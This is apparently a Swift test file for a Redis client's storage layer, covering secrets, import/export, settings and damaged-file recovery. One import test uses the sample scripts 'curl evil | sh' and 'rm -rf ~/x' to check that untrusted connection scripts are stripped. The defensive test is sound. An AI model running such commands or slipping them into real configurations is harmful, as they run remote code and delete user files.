import Foundation
import RedisCore
import TestSupport
import Testing

struct DatabaseStoreTests {
    func makeStore() -> (DatabaseStore, CertificateStore, InMemorySecretStore, AppPaths) {
        let paths = AppPaths.temporary()
        let secrets = InMemorySecretStore()
        let certificates = CertificateStore(paths: paths, secrets: secrets)
        return (DatabaseStore(paths: paths, secrets: secrets, certificates: certificates), certificates, secrets, paths)
    }

    @Test func crudAndSecrets() async throws {
        let (store, _, secrets, paths) = makeStore()
        var config = DatabaseConfig(name: "Local", port: 6390, password: "pw",
                                    sentinelMaster: SentinelMasterConfig(name: "mymaster", password: "sentinel-pw"),
                                    ssh: SSHOptions(host: "bastion", username: "me", auth: .privateKey(pem: "KEY", passphrase: "pp")))
        config.tags = [DatabaseTag(key: "env", value: "dev")]
        try await store.create(config)
        let listed = try await store.list()
        #expect(listed.count == 1)
        #expect(listed[0].password == nil)
        #expect(listed[0].sentinelMaster?.password == nil)
        let full = try await store.get(config.id)
        #expect(full.password == "pw")
        #expect(full.sentinelMaster?.password == "sentinel-pw")
        #expect(full.ssh?.auth == .privateKey(pem: "KEY", passphrase: "pp"))
        let json = try String(contentsOf: paths.databasesFile, encoding: .utf8)
        #expect(!json.contains("sentinel-pw") && !json.contains("\"pw\""))

        let modified = try await store.modify(config.id) { $0.name = "Renamed"; $0.password = "leak" }
        #expect(modified.name == "Renamed")
        #expect(try await store.get(config.id).password == "pw")

        var updated = full
        updated.password = nil
        try await store.update(updated)
        #expect(try await store.get(config.id).password == nil)
        #expect(try await store.allTags() == [DatabaseTag(key: "env", value: "dev")])

        try await store.delete([config.id])
        #expect(try await store.list().isEmpty)
        #expect(try secrets.secret(for: SecretAccount.sshPrivateKey(config.id)) == nil)
        await #expect(throws: DatabaseStoreError.notFound(config.id)) { try await store.get(config.id) }
    }

    @Test func importStripsScriptsUntilTheyAreKept() async throws {
        let (store, _, _, _) = makeStore()
        let file = """
            [{"host": "10.0.0.1", "port": 6379, "name": "Scripted", "preConnectScript": "curl evil | sh",
              "postDisconnectScript": "rm -rf ~/x"}, {"host": "10.0.0.2", "port": 6379}]
            """
        let result = try await store.importDatabases(from: Data(file.utf8), filename: "f.json")
        let scripted = try #require(result.items.first)
        let id = try #require(scripted.databaseID)
        #expect(scripted.strippedScripts == .init(preConnect: "curl evil | sh", postDisconnect: "rm -rf ~/x"))
        #expect(result.items.last?.strippedScripts == nil)
        let saved = try await store.get(id)
        #expect(saved.preConnectScript == nil && saved.postDisconnectScript == nil)

        try await store.restoreScripts(scripted.strippedScripts, for: id)
        #expect(try await store.get(id).preConnectScript == "curl evil | sh")
        try await store.restoreScripts(nil, for: id)
        #expect(try await store.get(id).postDisconnectScript == nil)

        let kept = try await store.importDatabases(from: Data(file.utf8), filename: "f.json", keepScripts: true)
        let keptID = try #require(kept.items.first?.databaseID)
        #expect(try await store.get(keptID).preConnectScript == "curl evil | sh")
    }

    @Test func exportWithoutSecretsOmitsScripts() async throws {
        let (store, _, _, _) = makeStore()
        let config = DatabaseConfig(name: "S", password: "pw", preConnectScript: "pre", postDisconnectScript: "post")
        try await store.create(config)
        let plain = try #require(String(data: try await store.export(ids: [config.id], includeSecrets: false),
                                        encoding: .utf8))
        #expect(!plain.contains("preConnectScript") && !plain.contains("postDisconnectScript"))
        #expect(!plain.contains("\"pw\""))
        let full = try #require(String(data: try await store.export(ids: [config.id], includeSecrets: true),
                                       encoding: .utf8))
        #expect(full.contains("\"preConnectScript\" : \"pre\"") && full.contains("\"postDisconnectScript\" : \"post\""))
    }

    @Test func changeStreamFires() async throws {
        let (store, _, _, _) = makeStore()
        let stream = await store.changes()
        let waiter = Task { () -> Bool in
            for await _ in stream { return true }
            return false
        }
        try await store.create(DatabaseConfig(name: "A"))
        #expect(await waiter.value)
    }

    @Test func exportRoundTripWithCertificates() async throws {
        let (store, certificates, _, _) = makeStore()
        let ca = try await certificates.addCA(CACertificate(name: "ca", certificate: "-----BEGIN CERTIFICATE-----\nCA\n-----END CERTIFICATE-----"))
        let client = try await certificates.addClient(ClientCertificate(
            name: "client", certificate: "-----BEGIN CERTIFICATE-----\nCL\n-----END CERTIFICATE-----",
            key: "-----BEGIN PRIVATE KEY-----\nK\n-----END PRIVATE KEY-----"))
        var config = DatabaseConfig(name: "TLS DB", host: "redis.example.com", port: 6380, db: 2, username: "u",
                                    password: "secret", connectionType: .standalone)
        config.tls = TLSSettings(enabled: true, servername: "sni", verifyServerCert: true, caCertID: ca.id, clientCertID: client.id)
        config.compressor = .gzip
        config.environment = .production
        config.tags = [DatabaseTag(key: "team", value: "core")]
        try await store.create(config)

        let withoutSecrets = try await store.export(ids: [config.id, DatabaseID()], includeSecrets: false)
        let text = String(decoding: withoutSecrets, as: UTF8.self)
        #expect(!text.contains("secret"))
        #expect(!text.contains("PRIVATE KEY"))
        let objects = try #require(try JSONSerialization.jsonObject(with: withoutSecrets) as? [[String: Any]])
        #expect(objects.count == 1)
        #expect(objects[0]["host"] as? String == "redis.example.com")
        #expect((objects[0]["caCert"] as? [String: Any])?["name"] as? String == "ca")
        #expect(objects[0]["compressor"] as? String == "GZIP")

        let withSecrets = try await store.export(ids: [config.id], includeSecrets: true)
        let (other, otherCerts, _, _) = makeStore()
        let result = try await other.importDatabases(from: withSecrets, filename: "export.json")
        #expect(result.total == 1)
        #expect(result.success.count == 1)
        let imported = try #require(try await other.list().first)
        #expect(imported.id != config.id)
        #expect(imported.name == "TLS DB")
        #expect(imported.db == 2)
        #expect(imported.connectionType == .standalone)
        #expect(imported.environment == .production)
        #expect(imported.compressor == .gzip)
        #expect(imported.tls.enabled && imported.tls.verifyServerCert && imported.tls.servername == "sni")
        #expect(try await other.get(imported.id).password == "secret")
        let clientID = try #require(imported.tls.clientCertID)
        let importedClient = try #require(try await otherCerts.clientCertificate(clientID))
        #expect(importedClient.key?.contains("PRIVATE KEY") == true)
        #expect(try await otherCerts.listCA().count == 1)

        _ = try await other.importDatabases(from: withSecrets, filename: "export.json")
        #expect(try await otherCerts.listCA().count == 1)
        #expect(try await otherCerts.listClient().count == 1)
    }

    @Test func importsOtherToolFormats() async throws {
        let (store, _, _, _) = makeStore()
        let json = """
        [
          {"connectionName": "Commander", "host": "10.0.0.5", "port": "6380", "auth": "pw", "cluster": true},
          {"host": "s1", "port": 26379, "sentinelOptions": {"masterName": "mymaster", "sentinelPassword": "spw"}},
          {"host": "h", "port": 1, "compressor": "BOGUS", "sshHost": "jump", "sshUser": "root"},
          {"host": "", "port": 1},
          {"host": "t", "port": 2, "tls": true, "verifyServerCert": null},
          "nonsense"
        ]
        """
        let result = try await store.importDatabases(from: Data(json.utf8), filename: "redis-commander.json")
        #expect(result.total == 6)
        #expect(result.items.map(\.status) == [.success, .success, .partial, .fail, .success, .fail])
        #expect(result.items[2].errors.contains("Invalid compressor"))
        #expect(result.items[2].errors.contains("Invalid SSH body"))
        #expect(result.items[3].errors.last == "host should not be empty")
        let all = try await store.list()
        let commander = try #require(all.first { $0.name == "Commander" })
        #expect(commander.connectionType == .cluster)
        #expect(commander.port == 6380)
        #expect(commander.isNew)
        #expect(try await store.get(commander.id).password == "pw")
        let sentinel = try #require(all.first { $0.host == "s1" })
        #expect(sentinel.connectionType == .sentinel)
        #expect(sentinel.sentinelMaster?.name == "mymaster")
        #expect(try await store.get(sentinel.id).sentinelMaster?.password == "spw")
        #expect(sentinel.name == "s1:26379")
        let plain = try #require(all.first { $0.host == "h" })
        #expect(plain.connectionType == .notConnected)
        #expect(plain.ssh == nil)
        let tls = try #require(all.first { $0.host == "t" })
        #expect(tls.tls.enabled && !tls.tls.verifyServerCert)
    }

    @Test func importFileErrors() async throws {
        let (store, _, _, _) = makeStore()
        await #expect(throws: DatabaseStoreError.importFailed("No file was chosen to import.")) {
            try await store.importDatabases(from: Data(), filename: "x.json")
        }
        await #expect(throws: DatabaseStoreError.importFailed("Unable to parse x.json")) {
            try await store.importDatabases(from: Data("{}".utf8), filename: "x.json")
        }
        await #expect(throws: DatabaseStoreError.importFailed("Unable to parse x.json")) {
            try await store.importDatabases(from: Data("[]".utf8), filename: "x.json")
        }
        let big = Data(repeating: 0x20, count: DatabaseStore.maxImportBytes + 1)
        await #expect(throws: DatabaseStoreError.importFailed("The file is larger than the 10 MB import limit.")) {
            try await store.importDatabases(from: big, filename: "x.json")
        }
    }
}

struct SecretStoreTests {
    @Test func inMemoryStore() throws {
        let store = InMemorySecretStore()
        try store.setSecret("a", for: "acc")
        #expect(try store.secret(for: "acc") == "a")
        try store.setSecret(nil, for: "acc")
        #expect(try store.secret(for: "acc") == nil)
    }

    static let keychainAvailable: Bool = {
        let store = KeychainStore(service: "Keystrand-Tests-Probe-\(UUID().uuidString)")
        let account = "probe"
        guard (try? store.setSecret("probe", for: account)) != nil else { return false }
        try? store.setSecret(nil, for: account)
        return true
    }()

    @Test(.enabled(if: keychainAvailable, "The login keychain is unavailable in this environment"))
    func keychainRoundTrip() throws {
        let store = KeychainStore(service: "Keystrand-Tests-\(UUID().uuidString)")
        let account = "test.\(UUID().uuidString)"
        try store.setSecret("first", for: account)
        #expect(try store.secret(for: account) == "first")
        try store.setSecret("second", for: account)
        #expect(try store.secret(for: account) == "second")
        try store.setSecret(nil, for: account)
        #expect(try store.secret(for: account) == nil)
        try store.setSecret(nil, for: account)
    }

    @Test func accountsCoverAllDatabaseSecrets() {
        let id = DatabaseID(rawValue: "abc")
        #expect(SecretAccount.all(for: id).count == 5)
        #expect(SecretAccount.password(id) == "abc.password")
        #expect(SecretAccount.clientCertificateKey("c1") == "cert.c1.key")
    }
}

@MainActor
struct SettingsPersistenceTests {
    @Test func settingsStorePersists() throws {
        let paths = AppPaths.temporary()
        let store = SettingsStore(paths: paths)
        store.app.scanThreshold = 100
        store.app.theme = .dark
        store.ui.autoRefreshRates["keys"] = 2.5
        store.browser.viewType = .list
        store.pushCLIHistory("GET a")
        store.pushCLIHistory("GET b")
        store.pushCLIHistory("GET a")
        #expect(store.ui.cliInputHistory == ["GET a", "GET b"])
        #expect(store.app.effectiveScanThreshold == AppSettings.minimumScanThreshold)

        let reloaded = SettingsStore(paths: paths)
        #expect(reloaded.app.theme == .dark)
        #expect(reloaded.app.scanThreshold == 100)
        #expect(reloaded.ui.autoRefreshRate("keys") == 2.5)
        #expect(reloaded.ui.autoRefreshRate("other") == UIPreferences.defaultAutoRefreshRate)
        #expect(reloaded.browser.viewType == .list)
        #expect(reloaded.ui.cliInputHistory.first == "GET a")
        for i in 0..<30 { reloaded.pushCLIHistory("C\(i)") }
        #expect(reloaded.ui.cliInputHistory.count == 20)
    }

    @Test func toleratesPartialSettingsFiles() throws {
        let paths = AppPaths.temporary()
        try FileManager.default.createDirectory(at: paths.root, withIntermediateDirectories: true)
        try Data(#"{"app":{"theme":"light","unknown":1},"ui":{"pubSubPageSize":"bad"}}"#.utf8).write(to: paths.settingsFile)
        let store = SettingsStore(paths: paths)
        #expect(store.app.theme == .light)
        #expect(store.app.workbenchBatchSize == 5)
        #expect(store.ui.pubSubPageSize == 10)
    }

    @Test func databaseSettingsStore() async throws {
        let store = DatabaseSettingsStore(paths: .temporary())
        let id = DatabaseID()
        #expect(await store.settings(for: id).treeViewDelimiters == [":"])
        try await store.update(id) { settings in
            settings.treeViewDelimiters = ["-"]
            settings.setFeature(["a": 1], key: "feature")
        }
        let value = await store.settings(for: id)
        #expect(value.treeViewDelimiters == ["-"])
        #expect(value.feature([String: Int].self, key: "feature") == ["a": 1])
        await store.delete(id)
        #expect(await store.settings(for: id).treeViewDelimiters == [":"])
    }

    @Test func historyCapAndSizeLimit() async throws {
        let store = CommandHistoryStore(paths: .temporary())
        let id = DatabaseID()
        for i in 0..<35 {
            try await store.add([CommandExecution(databaseId: id, command: "GET \(i)",
                                                  result: [CommandExecutionResult(status: .success, response: .reply(.string("v")))])])
        }

        let list = await store.list(databaseID: id, type: .workbench)
        #expect(list.count == CommandHistoryStore.maxItems)
        #expect(list.first?.command == "GET 34")
        #expect(list.first?.result == nil)
        let big = String(repeating: "x", count: CommandHistoryStore.maxResultBytes + 10)
        let execution = CommandExecution(databaseId: id, command: "GET big",
                                         result: [CommandExecutionResult(status: .success, response: .reply(.string(big)))])
        try await store.add([execution])
        let stored = try #require(await store.get(execution.id, databaseID: id, type: .workbench))
        #expect(stored.result?.first?.sizeLimitExceeded == true)
        try await store.clear(databaseID: id, type: .workbench)
        #expect(await store.list(databaseID: id, type: .workbench).isEmpty)
    }

    @Test func queryLibrary() async throws {
        let store = QueryLibraryStore(paths: .temporary())
        let id = DatabaseID()
        let sample = QueryLibraryItem(databaseId: id, indexName: "idx", type: .sample, name: "S", query: "FT.SEARCH idx *")
        try await store.seed([sample])
        try await store.seed([QueryLibraryItem(databaseId: id, indexName: "idx", type: .sample, name: "S", query: "x")])
        try await store.create(QueryLibraryItem(databaseId: id, indexName: "other", name: "Mine", query: "q"))
        #expect(await store.list(databaseID: id, indexName: "idx").count == 1)
        #expect(await store.list(databaseID: id).count == 2)
        try await store.deleteByIndex(databaseID: id, indexName: "idx")
        #expect(await store.list(databaseID: id).map(\.name) == ["Mine"])
    }
}

struct AppPathsTests {
    @Test func dataDirectoryEnvironmentOverridesRoot() {
        let paths = AppPaths.resolved(environment: ["KEYSTRAND_DATA_DIR": "/tmp/keystrand-data-dir-test"])
        #expect(paths.root.path == "/tmp/keystrand-data-dir-test")
        #expect(paths.databasesFile.path == "/tmp/keystrand-data-dir-test/databases.json")
    }

    @Test func dataDirectoryExpandsTilde() {
        let paths = AppPaths.resolved(environment: ["KEYSTRAND_DATA_DIR": "~/keystrand-data-dir-test"])
        #expect(paths.root.path == (NSHomeDirectory() as NSString).appendingPathComponent("keystrand-data-dir-test"))
    }

    @Test func blankOrMissingOverrideUsesApplicationSupport() {
        for environment in [[:], ["KEYSTRAND_DATA_DIR": "  "]] {
            let paths = AppPaths.resolved(environment: environment)
            #expect(paths.root.lastPathComponent == "Keystrand")
            #expect(paths.root.deletingLastPathComponent().lastPathComponent == "Application Support")
        }
    }
}

struct DatabaseFileCompatibilityTests {
    private func store(writing json: String) throws -> (DatabaseStore, AppPaths) {
        let paths = AppPaths.temporary()
        try FileManager.default.createDirectory(at: paths.root, withIntermediateDirectories: true)
        try Data(json.utf8).write(to: paths.databasesFile)
        return (DatabaseStore(paths: paths, secrets: InMemorySecretStore()), paths)
    }

    private func backups(in paths: AppPaths, named prefix: String) throws -> [String] {
        try FileManager.default.contentsOfDirectory(atPath: paths.root.path).filter { $0.hasPrefix(prefix) }
    }

    @Test func unknownEnumValueFallsBackToDefault() async throws {
        let (store, paths) = try store(writing: """
            [{"id": "a", "name": "A", "host": "h", "port": 1, "connectionType": "ENTERPRISE",
              "environment": "staging", "compressor": "BROTLI", "timeoutMs": 1000, "createdAt": "2024-01-01T00:00:00Z",
              "isNew": false, "modules": [{"name": "search"}, {"version": 1}], "tls": {"enabled": true},
              "keyNameFormat": "Unicode", "forceStandalone": false, "tags": [], "connectionFamily": "auto"}]
            """)
        let list = try await store.list()
        #expect(list.count == 1)
        #expect(list.first?.name == "A")
        #expect(list.first?.connectionType == .notConnected)
        #expect(list.first?.environment == .unspecified)
        #expect(list.first?.compressor == DatabaseConfig().compressor)
        #expect(list.first?.modules.map(\.name) == ["search"])
        #expect(list.first?.tls.enabled == true)
        #expect(list.first?.tls.verifyServerCert == false)
        #expect(try backups(in: paths, named: "databases.damaged-").isEmpty)
    }

    @Test func missingFieldsUseDefaultsAndDamagedRecordsAreBackedUp() async throws {
        let (store, paths) = try store(writing: """
            [{"id": "a", "host": "h", "port": 7000}, {"name": "no id"}, "garbage"]
            """)
        let list = try await store.list()
        #expect(list.map(\.id.rawValue) == ["a"])
        #expect(list.first?.name == "h:7000")
        #expect(list.first?.timeoutMs == 30_000)
        #expect(try backups(in: paths, named: "databases.damaged-").count == 1)

        try await store.create(DatabaseConfig(name: "B"))
        let reloaded = DatabaseStore(paths: paths, secrets: InMemorySecretStore())
        #expect(try await reloaded.list().map(\.name) == ["h:7000", "B"])
        let json = try String(contentsOf: paths.databasesFile, encoding: .utf8)
        #expect(json.contains("\"schemaVersion\" : 1"))
    }

    @Test func unparseableFileIsBackedUpAndCreateStillWorks() async throws {
        let (store, paths) = try store(writing: "{ not json")
        #expect(try await store.list().isEmpty)
        #expect(try backups(in: paths, named: "databases.damaged-").count == 1)
        try await store.create(DatabaseConfig(name: "New"))
        #expect(try await store.list().map(\.name) == ["New"])
    }

    @Test func futureSchemaVersionKeepsRecordsAndBacksUpOriginal() async throws {
        let (store, paths) = try store(writing: """
            {"schemaVersion": 99, "databases": [{"id": "a", "host": "h", "port": 1, "futureField": {"x": 1}}],
             "futureTopLevel": true}
            """)
        #expect(try await store.list().map(\.id.rawValue) == ["a"])
        #expect(try backups(in: paths, named: "databases.v99-").count == 1)
    }

    @Test func certificatesFileToleratesDamagedEntries() async throws {
        let paths = AppPaths.temporary()
        try FileManager.default.createDirectory(at: paths.root, withIntermediateDirectories: true)
        try Data("""
            {"ca": [{"id": "1", "name": "CA", "certificate": "PEM"}, {"id": "2"}], "client": "nope"}
            """.utf8).write(to: paths.certificatesFile)
        let certificates = CertificateStore(paths: paths, secrets: InMemorySecretStore())
        #expect(try await certificates.listCA().map(\.name) == ["CA"])
        #expect(try await certificates.listClient().isEmpty)
        #expect(try backups(in: paths, named: "certificates.damaged-").count == 1)
    }
}
